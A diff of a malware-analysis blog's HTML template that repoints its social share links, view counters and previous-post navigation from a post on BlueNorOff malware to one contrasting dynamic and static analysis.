-      href="https://reddit.com/submit/?url=https://polaryse.github.io/posts/bluenoroff-malware/&amp;resubmit=true&amp;title=Delving%20into%20BlueNorOff%20malware"
+      href="https://reddit.com/submit/?url=https://polaryse.github.io/topics/understanding_analysis/&amp;resubmit=true&amp;title=The%20difference%20between%20Dynamic%20and%20Static%20analysis"
       title="Submit to Reddit"
       aria-label="Submit to Reddit"
       >
@@ -1565,7 +1340,7 @@ What persistence mechanism, if any, does this malware use?</p>
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://www.facebook.com/sharer/sharer.php?u=https://polaryse.github.io/posts/bluenoroff-malware/&amp;quote=Delving%20into%20BlueNorOff%20malware"
+      href="https://www.facebook.com/sharer/sharer.php?u=https://polaryse.github.io/topics/understanding_analysis/&amp;quote=The%20difference%20between%20Dynamic%20and%20Static%20analysis"
       title="Share on Facebook"
       aria-label="Share on Facebook"
       >
@@ -1584,7 +1359,7 @@ What persistence mechanism, if any, does this malware use?</p>
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="mailto:?body=https://polaryse.github.io/posts/bluenoroff-malware/&amp;subject=Delving%20into%20BlueNorOff%20malware"
+      href="mailto:?body=https://polaryse.github.io/topics/understanding_analysis/&amp;subject=The%20difference%20between%20Dynamic%20and%20Static%20analysis"
       title="Send via email"
       aria-label="Send via email"
       >
@@ -1607,8 +1382,8 @@ What persistence mechanism, if any, does this malware use?</p>
      
     
      <script>
-        var oid = "views_posts\/Bluenoroff malware\/index.md"
-        var oid_likes = "likes_posts\/Bluenoroff malware\/index.md"
+        var oid = "views_topics\/understanding_analysis\/index.md"
+        var oid_likes = "likes_topics\/understanding_analysis\/index.md"
       </script>
       
       
@@ -1628,7 +1403,7 @@ What persistence mechanism, if any, does this malware use?</p>
       <div class="flex justify-between pt-3">
         <span>
           
-            <a class="flex group mr-3" href="/posts/pureland_analysis/">
+            <a class="flex group mr-3" href="/topics/0xcc-2023/">
               <span
                 class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                 >&larr;</span
@@ -1640,7 +1415,7 @@ What persistence mechanism, if any, does this malware use?</p>
               <span class="flex flex-col">
                 <span
                   class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
-                  >Analysis of PureLand Info Stealer</span
+                  >0xCC Conference</span
                 >
                 <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                   
